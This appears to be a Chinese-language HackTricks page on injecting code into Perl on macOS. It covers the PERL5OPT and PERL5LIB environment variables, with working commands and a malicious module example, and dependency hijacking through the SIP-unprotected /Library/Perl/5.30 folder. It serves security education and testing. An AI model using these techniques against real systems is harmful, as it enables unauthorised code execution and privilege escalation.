# macOS Perl 应用程序注入

{{#include ../../../banners/hacktricks-training.md}}

## 通过 `PERL5OPT` 和 `PERL5LIB` 环境变量

使用环境变量 PERL5OPT，可以使 perl 执行任意命令。\
例如，创建这个脚本：
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
现在**导出环境变量**并执行**perl**脚本：
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
另一个选项是创建一个 Perl 模块（例如 `/tmp/pmod.pm`）：
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
然后使用环境变量：
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## 通过依赖

可以列出运行 Perl 的依赖文件夹顺序：
```bash
perl -e 'print join("\n", @INC)'
```
这将返回类似于：
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
一些返回的文件夹甚至不存在，然而，**`/Library/Perl/5.30`** 确实 **存在**，它 **不** 被 **SIP** **保护**，并且在被 **SIP** 保护的文件夹 **之前**。因此，有人可以滥用该文件夹在其中添加脚本依赖项，以便高权限的 Perl 脚本将其加载。

> [!WARNING]
> 然而，请注意，您 **需要是 root 才能写入该文件夹**，而如今您会看到这个 **TCC 提示**：

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

例如，如果一个脚本导入 **`use File::Basename;`**，则可以创建 `/Library/Perl/5.30/File/Basename.pm` 来执行任意代码。

## References

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
